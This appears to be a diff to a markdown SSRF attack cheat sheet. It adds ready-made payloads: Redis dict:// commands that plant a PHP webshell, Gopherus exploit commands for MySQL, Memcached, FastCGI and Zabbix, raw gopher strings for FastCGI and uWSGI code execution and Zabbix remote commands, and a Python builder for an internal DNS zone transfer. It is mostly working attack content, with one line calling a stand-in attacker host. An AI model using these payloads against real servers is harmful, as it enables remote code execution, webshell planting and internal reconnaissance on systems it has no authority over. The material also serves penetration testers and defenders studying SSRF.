@@ -30,6 +30,55 @@ ssrf.php?url=dict://attacker:11111/
 ssrf.php?url=ldap://localhost:11211/%0astats%0aquit     # %0a injects memcached cmds
 ```
 
+## Redis -> PHP webshell via dict:// (each line is one Redis command)
+Point dump dir at the webroot, name the dump `.php`, store shell code, SAVE.
+```
+dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+dict://127.0.0.1:6379/SAVE
+# then: GET /file.php?0=id
+```
+Same via gopher (`_` + url-encoded `config set dir ...` / `set ...` / `save`).
+
+## MySQL / Memcached / PostgreSQL / FastCGI / Zabbix — generate with Gopherus
+```
+python2 gopherus.py --exploit mysql        # asks for user (no password) + query
+python2 gopherus.py --exploit pymemcache    # rbmemcache / phpmemcache / dmpmemcache variants
+python2 gopherus.py --exploit fastcgi       # needs a known PHP file path on disk
+python2 gopherus.py --exploit zabbix
+```
+FastCGI raw form (RCE via `PHP_VALUE` overriding `auto_prepend_file=php://input`;
+default script `/usr/share/php/PEAR.php`):
+```
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00...SCRIPT_FILENAME/usr/share/php/PEAR.php...%3C%3Fphp%20system%28%27id%27%29%3F%3E
+```
+
+## Zabbix agent remote command (EnableRemoteCommands=1)
+```
+gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
+```
+
+## uWSGI exec via gopher (uwsgi_exp.py builds the full string)
+```
+gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
+```
+modifier1=%00, datasize=%1A%00, then key `UWSGI_FILE` -> value = path to a
+.py the attacker first writes to disk.
+
+## Internal DNS zone transfer (AXFR) over gopher -> subdomain list
+SSRF to the internal resolver (TCP/53) with a raw AXFR query enumerates the
+zone. Build the byte-string in Python (QTYPE AXFR = 252, QCLASS IN = 1):
+```py
+from urllib.parse import quote
+domain, tld = "example.lab".split('.')
+r  = b"\x01\x03\x03\x07\x00\x01\x00\x00\x00\x00\x00\x00"
+r += len(domain).to_bytes(1,'big') + domain.encode()
+r += len(tld).to_bytes(1,'big') + tld.encode()
+r += b"\x00\x00\xFC\x00\x01"
+print('gopher://127.0.0.1:53/_' + quote(len(r).to_bytes(2,'big') + r))
+```
+
 ## SMTP banner -> internal hostname enumeration
 SSRF to `localhost:25`, read line 1 (`220 host.internaldomain.com ESMTP`), then
 search that internal domain on GitHub for subdomains to pivot to.
